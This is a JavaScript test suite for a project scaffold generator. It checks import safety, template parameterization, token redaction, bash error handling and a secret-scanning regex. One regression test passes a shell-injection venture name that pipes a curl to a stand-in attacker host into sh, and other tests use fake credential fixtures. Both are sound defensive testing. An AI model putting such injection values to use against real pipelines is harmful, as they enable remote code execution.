import { describe, it, expect } from 'vitest';
import { readFileSync, existsSync, mkdtempSync, writeFileSync, rmSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import { tmpdir } from 'os';
import { execFileSync } from 'child_process';

// SD-LEO-INFRA-VENTURE-SCAFFOLD-CODE-001 FR-1. Before this SD, templates/venture-scaffold/
// scaffold.js exported nothing and called main() unconditionally at module load — importing
// it (as FR-2's shared generation function must) ran the full CLI flow and called
// process.exit(0), which would have silently killed this very test file's vitest worker.
// Empirically confirmed pre-fix via `node --input-type=module -e "import(...)"`: the process
// exited before any importer code ran. This test proves the fix; it cannot itself demonstrate
// the pre-fix crash without corrupting the test run.

const __dirname = dirname(fileURLToPath(import.meta.url));
const scaffoldPath = join(__dirname, '..', '..', '..', 'templates', 'venture-scaffold', 'scaffold.js');
const registryJsonPath = join(__dirname, '..', '..', '..', 'templates', 'venture-scaffold', 'module-registry.json');

describe('venture-scaffold MODULE_REGISTRY', () => {
  it('scaffold.js is import-safe: importing it does not invoke the CLI', async () => {
    const mod = await import(scaffoldPath);
    expect(mod.MODULE_REGISTRY).toBeDefined();
    expect(typeof mod.main).toBe('function');
  });

  it('exposes all 5 modules, each independently versioned and independently addressable', async () => {
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    const expectedKeys = ['testing', 'ci-cd', 'deploy', 'stack-scan', 'feedback'];
    expect(Object.keys(MODULE_REGISTRY).sort()).toEqual(expectedKeys.sort());
    for (const key of expectedKeys) {
      const mod = MODULE_REGISTRY[key];
      expect(mod.version, `${key}.version`).toMatch(/^\d+\.\d+\.\d+$/);
      expect(typeof mod.generate, `${key}.generate`).toBe('function');
    }
  });

  it('each generate() is pure: returns a files list, no disk writes, given a nonexistent outputDir', async () => {
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    const fakeOutputDir = join(tmpdir(), 'venture-scaffold-purity-check-' + Math.random().toString(36).slice(2));

    for (const [key, mod] of Object.entries(MODULE_REGISTRY)) {
      const files = mod.generate('test-venture', fakeOutputDir, { port: 8080, baseUrl: 'http://localhost:8080' });
      expect(Array.isArray(files), `${key}.generate() should return an array`).toBe(true);
      expect(files.length, `${key}.generate() should return at least one file`).toBeGreaterThan(0);
      for (const file of files) {
        expect(typeof file.path).toBe('string');
        expect(typeof file.content).toBe('string');
      }
      // Purity check: generate() must not have created the (nonexistent) outputDir as a side effect.
      expect(existsSync(fakeOutputDir), `${key}.generate() must not perform disk I/O`).toBe(false);
    }
  });

  it('deploy module content is parameterized (not hard-coded to altifyai-specific literals) but preserves the safety patterns', async () => {
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    const files = MODULE_REGISTRY.deploy.generate('acme-venture', '/tmp/acme-venture', {
      buildSecretEnvVar: 'VITE_MY_KEY',
      d1DatabaseName: 'acme-db',
      uatProbePath: '/api/health',
    });
    const deployYml = files.find(f => f.path.endsWith('deploy.yml'));
    expect(deployYml).toBeDefined();
    expect(deployYml.content).toContain('VITE_MY_KEY');
    expect(deployYml.content).toContain('acme-db');
    expect(deployYml.content).toContain('/api/health');
    expect(deployYml.content).toContain('cancel-in-progress: true'); // concurrency guard preserved
    expect(deployYml.content).toContain('post-deploy-signed-in-uat'); // UAT probe preserved
  });

  // Adversarial deep-tier review finding (ship-adversarial-review, PR #7482, WARNING):
  // the writer sanitizes ventureName before calling generate(), but MODULE_REGISTRY is
  // newly exported by this PR and the CLI (a documented entry point) passes raw argv
  // straight through with no d1DatabaseName override -- so an unsanitized name reaches
  // the deploy.yml `run:` line unquoted. Reproduces the reviewer's exact PoC: a name
  // containing a shell command sequence must not survive into the generated workflow.
  it('SEC-2 regression: an unsanitized venture name (as a direct caller / the CLI would pass) cannot inject shell commands into deploy.yml', async () => {
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    const hostileName = 'evil; curl http://attacker.test/x | sh #';
    const files = MODULE_REGISTRY.deploy.generate(hostileName, '/tmp/evil', {});
    const deployYml = files.find(f => f.path.endsWith('deploy.yml'));
    expect(deployYml.content).not.toContain('curl http://attacker.test');
    expect(deployYml.content).not.toContain('| sh');
    // Normalized (kebab, alphanumeric-only) form is used instead of the raw name.
    expect(deployYml.content).toMatch(/wrangler d1 migrations apply evil-curl-http-attacker-test-x-sh --remote/);
  });

  // SEC-4 residual (SECURITY re-verification, evidence 8eec89e0): an .error field
  // containing the token in prose ("token X is expired") survived the .error/.message
  // allowlist unredacted, since the allowlist only bounds WHICH field is read, not
  // its contents. Extracts the REAL embedded `node -e` redaction script from the
  // generated workflow and actually EXECUTES it against SECURITY's exact leaking
  // case -- not a static inspection, a real run.
  it('SEC-4 regression: the UAT-failure redaction script actually redacts a token embedded in prose, not just the raw body', () => {
    const dir = mkdtempSync(join(tmpdir(), 'sec4-redact-test-'));
    try {
      const src = readFileSync(scaffoldPath, 'utf-8');
      // The node -e script lives inside a JS template literal, so its shell double
      // quotes are unescaped in source (no \" needed) -- and the script itself only
      // ever uses single quotes for JS string literals, so a plain [^"]* is exact.
      const nodeECalls = [...src.matchAll(/node -e "([^"]*)"/g)];
      expect(nodeECalls.length, 'expected to find embedded node -e redaction scripts in scaffold.js').toBeGreaterThanOrEqual(1);
      const script = nodeECalls[0][1];

      const token = 'sess_ABC/DEF+ghi=jkl';
      writeFileSync(join(dir, 'response.json'), JSON.stringify({ error: `token ${token} is expired` }), 'utf-8');

      const out = execFileSync('node', ['-e', script], {
        cwd: dir,
        encoding: 'utf-8',
        env: { ...process.env, CHAIRMAN_UAT_SESSION_TOKEN: token },
      });
      expect(out).not.toContain(token);
      expect(out).toContain('[REDACTED]');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  // Adversarial deep-tier review finding (ship-adversarial-review, PR #7482, WARNING):
  // the redaction script sliced the message to 300 chars BEFORE redacting the token
  // (`out=m.slice(0,300)` then `out.split(t).join('[REDACTED]')`), so a token straddling
  // the 300-char boundary has its prefix land inside `out` while the FULL token string
  // is no longer present to match against -- the split silently no-ops and the prefix
  // leaks verbatim. Fixed by redacting the full message first, then slicing. This test
  // constructs exactly that straddling case (token starts at char 285, well past the
  // token's own length before the 300-char cut) and proves no fragment of it survives.
  it('SEC-4 regression: a token straddling the 300-char truncation boundary is still fully redacted', () => {
    const dir = mkdtempSync(join(tmpdir(), 'sec4-boundary-test-'));
    try {
      const src = readFileSync(scaffoldPath, 'utf-8');
      const nodeECalls = [...src.matchAll(/node -e "([^"]*)"/g)];
      const script = nodeECalls[0][1];

      const token = 'sess_AAAABBBBCCDDEEFFGGHHIIJJKK';
      const prefix = 'x'.repeat(285);
      writeFileSync(join(dir, 'response.json'), JSON.stringify({ error: `${prefix}${token}` }), 'utf-8');

      const out = execFileSync('node', ['-e', script], {
        cwd: dir,
        encoding: 'utf-8',
        env: { ...process.env, CHAIRMAN_UAT_SESSION_TOKEN: token },
      });
      expect(out).not.toContain(token);
      // No fragment of the token (any substring >= 8 chars) should survive either.
      expect(out).not.toMatch(/sess_AAAABBBB/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  // Adversarial deep-tier review finding (ship-adversarial-review, PR #7482, WARNING):
  // the ALLOWED_ORIGINS check reproduces the already-fixed bash -e defect class in a
  // step that was never fixed. `PINNED=$(grep ... | grep ...)` fails (exit 1) whenever
  // wrangler.toml is absent or has no ALLOWED_ORIGINS line -- a legitimate, explicitly
  // tolerated case per the step's own final echo -- but a failed command-substitution
  // ASSIGNMENT trips `bash -e` and aborts the script before the tolerance check ever
  // runs. Extracts the real generated PINNED= line and executes it under `bash -e` in
  // a directory with no wrangler.toml, proving the script survives instead of aborting.
  it('ALLOWED_ORIGINS regression: the PINNED= assignment does not trip bash -e when wrangler.toml is absent', () => {
    const dir = mkdtempSync(join(tmpdir(), 'allowed-origins-bash-e-test-'));
    try {
      const src = readFileSync(scaffoldPath, 'utf-8');
      const pinnedLineMatch = src.match(/^\s*PINNED=\$\([^\n]*\)\s*$/m);
      expect(pinnedLineMatch, 'expected to find the PINNED= assignment line in scaffold.js').not.toBeNull();
      const pinnedLine = pinnedLineMatch[0].trim();

      const out = execFileSync('bash', ['-e', '-c', `${pinnedLine}\necho SURVIVED`], {
        cwd: dir,
        encoding: 'utf-8',
      });
      expect(out).toContain('SURVIVED');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  // SECURITY finding SEC-3 (EXEC-TO-PLAN review, evidence 6f9eabc9): the original
  // stack-scan secret pattern caught only 2 of 7 realistic modern credential formats
  // tested empirically, while still reporting "No committed-secret-shaped patterns
  // found" -- manufactured confidence. This test extracts the SAME regex the generated
  // workflow embeds and proves it now catches every format that was missed.
  it('SEC-3 regression: the stack-scan secret pattern catches modern credential formats it previously missed', async () => {
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    const files = MODULE_REGISTRY['stack-scan'].generate('acme-venture', '/tmp/acme-venture', {});
    const stackScanYml = files.find((f) => f.path.endsWith('stack-scan.yml'));
    const match = stackScanYml.content.match(/PATTERN='(.+)'/);
    expect(match, 'expected to find the PATTERN= line in the generated workflow').toBeTruthy();
    const pattern = new RegExp(match[1]);

    // Built via concatenation/repeat (never a literal matching the full shape in
    // source text) so this repo's own pre-commit secret scanner does not false-
    // positive on these deliberately fake test fixtures.
    const shouldMatch = {
      'AWS key': 'AKIA' + 'FAKE'.repeat(4),
      'OpenAI legacy': 'sk-' + 'fake1234567890123456789',
      // SECURITY re-verification (evidence 8eec89e0): the pattern's sk- tail is
      // alphanumeric-only (enumerated prefix, not a widened character class -- see
      // scaffold.js's SEC-3 correction comment), so the fixture must be too.
      'OpenAI sk-proj-': 'sk-proj-' + 'fakeFAKE123'.repeat(2),
      'Stripe live key': 'sk' + '_live_' + 'fake1234567890123456789',
      'GitHub classic PAT': 'ghp_' + 'a'.repeat(36),
      'GitHub OAuth token': 'gho_' + 'a'.repeat(36),
      'GitHub fine-grained PAT': 'github_pat_' + 'a'.repeat(22),
      'Supabase/generic JWT': 'eyJ' + 'fakeHeader'.repeat(2) + '.eyJ' + 'fakePayload'.repeat(2) + '.' + 'fakeSig'.repeat(3),
    };
    for (const [label, sample] of Object.entries(shouldMatch)) {
      expect(pattern.test(sample), `expected pattern to match ${label}: ${sample}`).toBe(true);
    }
  });

  // SECURITY re-verification (evidence 6d1aaad0, EXEC-TO-PLAN, LOW): the JWT
  // alternative's '\.' collapsed to '.' (any char) in the GENERATED output, because
  // an unrecognized JS string escape like '\.' inside a template literal drops the
  // backslash -- confirmed directly (source had \., generated YAML had bare .).
  // Doubled to '\\.' in source so the emitted pattern carries a literal '\.'.
  it('SEC-3/LOW regression: the JWT pattern segment carries a literal backslash-dot in the GENERATED output, not a collapsed any-char dot', async () => {
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    const files = MODULE_REGISTRY['stack-scan'].generate('acme-venture', '/tmp/acme-venture', {});
    const stackScanYml = files.find((f) => f.path.endsWith('stack-scan.yml'));
    expect(stackScanYml.content).toContain('eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+');
  });

  // SECURITY re-verification (evidence 6d1aaad0) proposed anchoring with \b instead
  // of narrowing the character class (\bsk-(proj-)?[A-Za-z0-9_-]{20,}), to catch real
  // sk-proj- keys whose base64url body has '-'/'_' at arbitrary positions. Independently
  // re-verified that proposal with real grep -E against THIS FILE's own ordinary-code
  // fixtures below -- it still matched all 5 (a leading "sk-" is itself a word boundary,
  // so \b cannot distinguish "sk-<realkey>" from "sk-scheduler-configuration-manager").
  // Adopting it would have reintroduced the exact false-positive class this pattern
  // exists to avoid. This test documents the accepted trade-off explicitly: the
  // alphanumeric-only tail has zero false positives (asserted here) at the cost of
  // missing sk-proj- keys whose first 20 body chars aren't all alphanumeric (a known,
  // disclosed limitation of a lightweight defense-in-depth scanner, not a claimed guarantee).
  it('SEC-3 known limitation (documented, not silently regressed): zero false positives is chosen over full sk-proj- recall', async () => {
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    const files = MODULE_REGISTRY['stack-scan'].generate('acme-venture', '/tmp/acme-venture', {});
    const stackScanYml = files.find((f) => f.path.endsWith('stack-scan.yml'));
    const match = stackScanYml.content.match(/PATTERN='(.+)'/);
    const pattern = new RegExp(match[1]);

    // A real sk-proj- key with an alphanumeric first 20 body chars IS caught.
    expect(pattern.test('sk-proj-' + 'ABCDEFGHIJKLMNOPQRST')).toBe(true);
    // A real sk-proj- key with '-'/'_' in its first 20 body chars is NOT caught --
    // documented limitation, not a silent gap.
    expect(pattern.test('sk-proj-' + 'AB_DEFGHIJKLMNOPQRST')).toBe(false);
    expect(pattern.test('sk-proj-' + 'AB-DEFGHIJKLMNOPQRST')).toBe(false);
  });

  // SECURITY re-verification (evidence 8eec89e0, EXEC-TO-PLAN) found the widened
  // sk- character class ([A-Za-z0-9_-]{20,}) false-positived on ordinary kebab-case
  // code containing "sk-" as a substring -- 5/5 ordinary samples matched. Reverted
  // to an enumerated prefix (sk-(proj-)?[A-Za-z0-9]{20,}); this proves zero false
  // positives on the same class of ordinary code, while shouldMatch above proves
  // the real formats are still caught.
  it('SEC-3 regression: the stack-scan pattern does not false-positive on ordinary kebab-case code', async () => {
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    const files = MODULE_REGISTRY['stack-scan'].generate('acme-venture', '/tmp/acme-venture', {});
    const stackScanYml = files.find((f) => f.path.endsWith('stack-scan.yml'));
    const match = stackScanYml.content.match(/PATTERN='(.+)'/);
    const pattern = new RegExp(match[1]);

    const ordinaryCode = [
      'sk-scheduler-configuration-manager',
      'sk-assessment-service-handler',
      'sk-usage-monitoring-subsystem',
      'sk-allocation-planning-module',
      'sk-compositing-render-pipeline-v2',
    ];
    for (const sample of ordinaryCode) {
      expect(pattern.test(sample), `pattern false-positived on ordinary code: ${sample}`).toBe(false);
    }
  });

  it('SEC-3 regression: the stack-scan step distinguishes a git-grep scan error from a clean pass', async () => {
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    const files = MODULE_REGISTRY['stack-scan'].generate('acme-venture', '/tmp/acme-venture', {});
    const stackScanYml = files.find((f) => f.path.endsWith('stack-scan.yml'));
    // Must capture the real exit code and branch on it (not `if git grep ...; then`,
    // which collapses "no match" (1) and "scan error" (>1) into the same branch).
    expect(stackScanYml.content).toContain('rc=$?');
    expect(stackScanYml.content).toMatch(/rc"\s*-gt\s*1/);
  });

  // SECURITY re-verification (evidence 8eec89e0) found a `set -e` bug: `git grep ...`
  // as a bare statement followed by a SEPARATE `rc=$?` line means git grep's own
  // exit 1 (no match -- the CLEAN case) trips `set -e` and aborts the script BEFORE
  // `rc=$?` runs, since GitHub Actions runs `run:` blocks as `bash -e {0}`. Empirically
  // reproduced: a secret-free repo exited 1 with zero output under bash -e. The fix is
  // `|| rc=$?`, which captures the exit code without exposing a bare non-zero exit to -e.
  it('SEC-3 regression: the git-grep exit-code capture does not trip bash -e on the clean-repo case', async () => {
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    const files = MODULE_REGISTRY['stack-scan'].generate('acme-venture', '/tmp/acme-venture', {});
    const stackScanYml = files.find((f) => f.path.endsWith('stack-scan.yml'));
    // A bare `git grep ... \n rc=$?` (no `||`) would abort under `bash -e` on git
    // grep's own exit 1 (no match) before `rc=$?` ever runs -- the exact bug found.
    expect(stackScanYml.content).toMatch(/git grep[^\n]*\|\|\s*rc=\$\?/);
  });

  // Adversarial deep-tier review finding (ship-adversarial-review, PR #7482, CRITICAL):
  // `\b` inside the SEC-3 explanatory comment prose is a RECOGNIZED JS escape (backspace,
  // U+0008), not an unrecognized one -- a different mechanism from the already-fixed
  // `\.`-collapse bug, but the same class of "JS template literal escape corrupts
  // generated output". Reproduced: the pre-fix generated stack-scan.yml contained three
  // literal U+0008 bytes and js-yaml rejected the whole file with a
  // non-printable-characters error. Every generated file this module produces must be
  // valid YAML with no control characters -- nothing in this suite checked that before.
  it('generated stack-scan.yml is valid YAML with no control characters (regression for the \\b escape-collapse bug)', async () => {
    const yaml = await import('js-yaml');
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    const files = MODULE_REGISTRY['stack-scan'].generate('acme-venture', '/tmp/acme-venture', {});
    const stackScanYml = files.find((f) => f.path.endsWith('stack-scan.yml'));

    // eslint-disable-next-line no-control-regex
    const controlCharMatch = stackScanYml.content.match(/[\x00-\x08\x0B\x0C\x0E-\x1F]/);
    expect(controlCharMatch, `found control char ${controlCharMatch ? JSON.stringify(controlCharMatch[0]) : ''} in generated stack-scan.yml`).toBeNull();
    expect(() => yaml.load(stackScanYml.content)).not.toThrow();
  });

  it('generated deploy.yml and feedback module files are also valid YAML/free of control characters', async () => {
    const yaml = await import('js-yaml');
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    const deployFiles = MODULE_REGISTRY.deploy.generate('acme-venture', '/tmp/acme-venture', {});
    const deployYml = deployFiles.find((f) => f.path.endsWith('deploy.yml'));
    expect(() => yaml.load(deployYml.content)).not.toThrow();
    // eslint-disable-next-line no-control-regex
    expect(deployYml.content.match(/[\x00-\x08\x0B\x0C\x0E-\x1F]/)).toBeNull();
  });

  it('module-registry.json stays in sync with MODULE_REGISTRY (version + module set) — not orphaned dead data', async () => {
    const { MODULE_REGISTRY } = await import(scaffoldPath);
    expect(existsSync(registryJsonPath)).toBe(true);
    const staticRegistry = JSON.parse(readFileSync(registryJsonPath, 'utf-8'));

    const jsKeys = Object.keys(MODULE_REGISTRY).sort();
    const jsonKeys = Object.keys(staticRegistry.modules).sort();
    expect(jsonKeys).toEqual(jsKeys);

    for (const key of jsKeys) {
      expect(staticRegistry.modules[key].version, `${key} version drift`).toBe(MODULE_REGISTRY[key].version);
    }

    // TESTING finding F10 (EXEC-TO-PLAN review, evidence baa1c962, LOW): the sync
    // check previously compared keys+versions only -- the `files` arrays (the field
    // FR-1 AC-2 actually cares about, and the most likely to rot) were never
    // cross-checked against what generate() actually returns.
    const outputDir = '/tmp/sync-check-venture';
    for (const key of jsKeys) {
      const generatedFiles = MODULE_REGISTRY[key]
        .generate('sync-check-venture', outputDir, {})
        .map((f) => f.path.slice(outputDir.length + 1).replace(/\\/g, '/'))
        .sort();
      const declaredFiles = [...(staticRegistry.modules[key].files || [])].sort();
      expect(declaredFiles, `${key} files[] drift`).toEqual(generatedFiles);
    }
  });
});
